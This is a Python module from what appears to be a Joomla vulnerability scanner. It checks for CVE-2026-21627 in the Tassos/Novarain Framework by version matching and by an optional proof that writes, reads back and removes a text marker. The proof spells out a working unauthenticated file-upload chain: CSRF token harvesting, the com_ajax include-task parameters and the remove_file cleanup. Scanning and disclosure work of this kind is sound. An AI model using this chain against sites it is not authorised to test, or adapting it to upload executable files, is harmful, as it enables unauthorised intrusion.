from __future__ import annotations

import base64
import json
import re
import secrets
import urllib.parse
from typing import Any

from ...core.http import HttpClient, build_multipart, normalize_url
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-21627"
NAME = "Novarain/Tassos Framework improper access control"
COMPONENT = "Novarain/Tassos Framework (plg_system_nrframework)"
AFFECTED_RULE = "Tassos Framework 4.10.14-6.0.37 and affected bundled product releases"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]

PRODUCTS: dict[str, tuple[str, str | None, str | None]] = {
    "nrframework": ("Novarain/Tassos Framework", "4.10.14", "6.0.37"),
    "convertforms": ("Convert Forms", "3.2.12", "5.1.0"),
    "engagebox": ("EngageBox", "6.0.0", "7.1.0"),
    "google_structured_data": ("Google Structured Data", "5.1.7", "6.1.0"),
    "advanced_custom_fields": ("Advanced Custom Fields", "2.2.0", "3.1.0"),
    "smilepack": ("Smile Pack", "1.0.0", "2.1.0"),
    "mailchimp_auto_subscribe": ("MailChimp Auto-Subscribe", None, None),
}


def _classify(version: str | None, minimum: str | None, maximum: str | None) -> str:
    parsed = parse_version_safe(version)
    lower = parse_version_safe(minimum)
    upper = parse_version_safe(maximum)
    if parsed is None or lower is None or upper is None:
        return "INCONCLUSIVE"
    if parsed < lower:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed <= upper else "PATCHED"


def _finding(status: str, confidence: str, detail: str, **kwargs: Any) -> Finding:
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action="Update plg_system_nrframework to 6.0.38 or newer and update every installed Tassos extension.",
        **kwargs,
    )


def _stored_filename(response: dict[str, Any]) -> tuple[str | None, str | None]:
    raw_path = response.get("file") if isinstance(response.get("file"), str) else None
    server_path = _decode_response_value(raw_path)
    if server_path:
        filename = server_path.replace("\\", "/").rsplit("/", 1)[-1]
        if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
            return filename, server_path
    encoded = response.get("file_name") if isinstance(response.get("file_name"), str) else None
    if encoded:
        filename = _decode_response_value(encoded) or encoded
        if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
            return filename, server_path
    return None, server_path


def _decode_response_value(value: str | None) -> str | None:
    if not value:
        return None
    try:
        decoded = base64.b64decode(value, validate=True).decode("utf-8")
        return decoded if decoded else value
    except (ValueError, UnicodeDecodeError):
        return value


def _ajax_candidates(base: str, homepage_url: str) -> list[str]:
    parsed = urllib.parse.urlsplit(homepage_url)
    path = parsed.path or "/"
    prefix = path if path.endswith("/") else path.rsplit("/", 1)[0] + "/"
    if prefix.endswith("/administrator/"):
        prefix = prefix[: -len("administrator/")]
    candidates = [
        f"{base}{prefix.rstrip('/')}/component/ajax/",
        f"{base}/component/ajax/",
        f"{base}/index.php",
    ]
    return list(dict.fromkeys(candidates))


def _invalid_token(body: str) -> bool:
    lowered = body.lower()
    return (
        "jinvalid_token" in lowered
        or "invalid token" in lowered
        or "token de segurança inválido" in lowered
        or "token de seguranca invalido" in lowered
    )


def _query_url(endpoint: str, params: dict[str, str]) -> str:
    if endpoint.endswith("index.php"):
        params = {"option": "com_ajax", **params}
    return f"{endpoint}?{urllib.parse.urlencode(params)}"


def _csrf_candidates(
    client: HttpClient,
    base: str,
    homepage_url: str,
    timeout: int,
) -> list[tuple[str, str]]:
    urls = [
        homepage_url,
        f"{base}/index.php?option=com_users&view=login",
        f"{base}/index.php?option=com_users&view=registration",
        f"{base}/index.php?option=com_contact",
    ]
    tokens: list[tuple[str, str]] = []
    seen: set[str] = set()
    for url in dict.fromkeys(urls):
        response = client.request(url, timeout=timeout)
        candidate = extract_csrf_from_html(response.get("body", ""))
        if candidate and candidate not in seen:
            seen.add(candidate)
            tokens.append((candidate, url))
    return tokens


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    initial = client.request(f"{base}/", timeout=timeout)
    homepage_url = initial.get("final_url") or f"{base}/"
    endpoint = None
    token = None
    token_source = None
    component_reachable = False
    preflight_detail = "no AJAX candidate accepted a session-bound token"
    for candidate in _ajax_candidates(base, homepage_url):
        trigger_url = _query_url(candidate, {"format": "raw", "plugin": "nrframework"})
        trigger = client.request(trigger_url, timeout=timeout, follow_redirects=False)
        bogus_url = _query_url(candidate, {"format": "raw", "plugin": "proofcmsnosuchplugin"})
        bogus = client.request(bogus_url, timeout=timeout, follow_redirects=False)
        trigger_body = trigger.get("body", "")
        bogus_body = bogus.get("body", "")
        candidate_reachable = (
            _invalid_token(trigger_body)
            and not _invalid_token(bogus_body)
            and trigger_body.strip() != bogus_body.strip()
        )
        token_candidates = _csrf_candidates(client, base, homepage_url, timeout)
        if not token_candidates:
            preflight_detail = "the refreshed frontend pages exposed no site-session CSRF token"
            continue
        for candidate_token, candidate_source in token_candidates:
            verify_params = {
                "format": "raw",
                "plugin": "nrframework",
                "task": "include",
                "path": "plugins/system/nrframework/fields/",
                "file": "nrinlinefileupload",
                "class": "JFormFieldNRInlineFileUpload",
                candidate_token: "1",
            }
            verify = client.request(
                _query_url(candidate, verify_params),
                timeout=timeout,
                follow_redirects=False,
            )
            if verify.get("status") in {301, 302, 303, 307, 308}:
                preflight_detail = "the candidate redirected instead of handling the token directly"
                break
            verify_body = verify.get("body", "")
            if _invalid_token(verify_body):
                preflight_detail = "Joomla rejected all extracted session-bound CSRF tokens"
                continue
            handler_signature = bool(
                re.search(
                    r"error|response|upload|FILE_ERROR|CLASS_ERROR|METHOD_ERROR",
                    verify_body,
                    re.IGNORECASE,
                )
            )
            if verify.get("status") != 200 or not (handler_signature or candidate_reachable):
                preflight_detail = "the candidate did not return an nrframework gadget response"
                continue
            endpoint = candidate
            token = candidate_token
            token_source = candidate_source
            component_reachable = candidate_reachable or handler_signature
            break
        if endpoint:
            break

    if not token or not endpoint:
        return _finding(
            "NOT_CONFIRMED",
            "LOW",
            f"The session/CSRF preflight failed: {preflight_detail}.",
            exploit_ran=True,
            evidence={
                "component_present": False,
                "token_accepted": False,
                "handler_reached": False,
                "write_reported": False,
                "readback_verified": False,
            },
        )

    nonce = secrets.token_hex(8)
    marker = f"ProofCMS CVE-2026-21627 safe proof {nonce}"
    original_name = f"proofcms-{nonce}.txt"
    params = {
        "format": "raw",
        "plugin": "nrframework",
        "task": "include",
        "path": "plugins/system/nrframework/fields/",
        "file": "nrinlinefileupload",
        "class": "JFormFieldNRInlineFileUpload",
        "upload_folder": base64.b64encode(b"images").decode(),
        token: "1",
    }
    upload_url = _query_url(endpoint, params)
    content_type, upload_body = build_multipart(
        {},
        {"file": (original_name, marker.encode(), "text/plain")},
    )
    upload = client.request(
        upload_url,
        method="POST",
        headers={"Content-Type": content_type},
        data=upload_body,
        timeout=timeout,
        follow_redirects=False,
    )
    try:
        upload_json = json.loads(upload.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        upload_json = {}
    if not isinstance(upload_json, dict) or upload_json.get("error") is not False:
        response_excerpt = re.sub(r"\s+", " ", upload.get("body", "")).strip()[:240]
        return _finding(
            "NOT_CONFIRMED",
            "MEDIUM",
            (
                f"The safe text upload was not accepted (HTTP {upload.get('status', 0)}). "
                f"Response: {response_excerpt or 'empty'}"
            ),
            exploit_ran=True,
            proof_url=endpoint,
            evidence={
                "component_present": component_reachable,
                "token_accepted": True,
                "handler_reached": True,
                "write_reported": False,
                "stored_name_returned": False,
                "readback_verified": False,
            },
        )

    filename, server_path = _stored_filename(upload_json)
    if not filename:
        return _finding(
            "VULNERABLE_UPLOAD_ONLY",
            "HIGH",
            "The vulnerable gadget reported a successful text upload, but returned no safe public filename for verification.",
            exploit_ran=True,
            proof_url=upload_url,
            evidence={
                "component_present": True,
                "token_accepted": True,
                "handler_reached": True,
                "write_reported": True,
                "stored_name_returned": False,
                "readback_verified": False,
            },
        )

    proof_url = f"{base}/images/{urllib.parse.quote(filename)}"
    proof = client.request(proof_url, timeout=timeout)
    if proof.get("status") != 200 or marker not in proof.get("body", ""):
        return _finding(
            "VULNERABLE_UPLOAD_ONLY",
            "HIGH",
            "The gadget accepted the upload and disclosed its stored filename, but the public marker could not be verified.",
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=filename,
            evidence={
                "component_present": True,
                "token_accepted": True,
                "handler_reached": True,
                "write_reported": True,
                "stored_name_returned": True,
                "readback_verified": False,
                "negative_control_match": None,
            },
        )

    cleaned = False
    if server_path:
        cleanup_params = dict(params)
        cleanup_params.pop("upload_folder", None)
        cleanup_params.update({"action": "remove", "remove_file": server_path})
        cleanup_url = _query_url(endpoint, cleanup_params)
        cleanup = client.request(cleanup_url, timeout=timeout)
        cleanup_check = client.request(proof_url, timeout=timeout)
        cleaned = cleanup.get("status") == 200 and (
            cleanup_check.get("status") in {403, 404, 410}
            or marker not in cleanup_check.get("body", "")
        )

    return _finding(
        "VULNERABLE",
        "CONFIRMED",
        (
            "A unique text marker was written through the unauthenticated nrframework gadget, fetched from /images/, "
            f"and removed using only its returned path. Token source: {token_source}."
            if cleaned
            else "A unique text marker was written through the unauthenticated nrframework gadget and fetched from /images/, but cleanup could not be verified."
        ),
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=None if cleaned else filename,
        cleanup_attempted=bool(server_path),
        cleanup_verified=cleaned,
        evidence={
            "component_present": True,
            "token_accepted": True,
            "handler_reached": True,
            "write_reported": True,
            "stored_name_returned": True,
            "readback_verified": True,
        },
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    detected: list[tuple[str, str | None, str]] = []
    for key, (label, minimum, maximum) in PRODUCTS.items():
        info = (plugins or {}).get(key, {})
        if info.get("found"):
            detected.append(
                (label, info.get("version"), _classify(info.get("version"), minimum, maximum))
            )

    if not detected:
        result = Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Neither the Tassos Framework nor a known bundling extension was detected.",
            action="Verify plg_system_nrframework manually if Tassos extensions use non-public paths.",
        )
        return result

    direct = next((item for item in detected if item[0] == "Novarain/Tassos Framework"), None)
    evidence = "; ".join(f"{label} {version or 'version unknown'}" for label, version, _ in detected)
    statuses = {status for _, _, status in detected}
    if direct and direct[2] == "LIKELY_VULNERABLE":
        status, confidence = "LIKELY_VULNERABLE", "HIGH"
        detail = f"Detected the affected framework directly. Evidence: {evidence}."
    elif direct and direct[2] == "PATCHED":
        status, confidence = "PATCHED", "HIGH"
        detail = f"The directly detected framework version is outside the affected range. Evidence: {evidence}."
    elif direct and direct[2] == "NOT_AFFECTED":
        status, confidence = "NOT_AFFECTED", "HIGH"
        detail = f"The directly detected framework version predates the published affected range. Evidence: {evidence}."
    elif "LIKELY_VULNERABLE" in statuses:
        status, confidence = "LIKELY_VULNERABLE", "HIGH"
        detail = f"Detected a product release listed as affected because it bundles the framework. Evidence: {evidence}."
    elif statuses == {"PATCHED"}:
        status, confidence = "PATCHED", "HIGH"
        detail = f"All detected product versions are outside their published affected ranges. Evidence: {evidence}."
    elif statuses == {"NOT_AFFECTED"}:
        status, confidence = "NOT_AFFECTED", "HIGH"
        detail = f"All detected product versions predate their published affected ranges. Evidence: {evidence}."
    else:
        status, confidence = "INCONCLUSIVE", "MEDIUM"
        detail = f"A framework-bundling product was detected, but affected status could not be resolved. Evidence: {evidence}."

    component_version = direct[1] if direct else None
    if status == "NOT_AFFECTED":
        action = "No remediation is required for this CVE; update bundled Tassos extensions for their independent advisories."
    elif status == "PATCHED":
        action = "Keep the Tassos Framework and bundled extensions updated."
    else:
        action = "Update plg_system_nrframework to 6.0.38 or newer and update every installed Tassos extension."
    result = Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=component_version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "safe":
        result.detail += " This module supports only the self-cleaning text-file proof."
        return result
    if not (plugins or {}).get("nrframework", {}).get("found"):
        result.detail += " Safe proof skipped because the framework itself was not detected."
        return result
    framework_version = (plugins or {}).get("nrframework", {}).get("version")
    framework_state = _classify(framework_version, "4.10.14", "6.0.37")
    if framework_state == "NOT_AFFECTED":
        result.detail += (
            " Safe proof skipped: this release predates 4.10.14. In the reproduced 4.9.62 source, "
            "onAjaxNrframework validates a frontend site-session token and then rejects every non-administrator "
            "client; administrator tokens belong to a separate backend session and are invalid at com_ajax."
        )
        return result
    if framework_state == "PATCHED":
        result.detail += " Safe proof skipped because the detected framework includes the 6.0.38 redesign."
        return result
    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    proof.component_version = framework_version
    return proof


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": list(PRODUCTS),
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-21627",
            "https://www.tassos.gr/",
        ],
    }
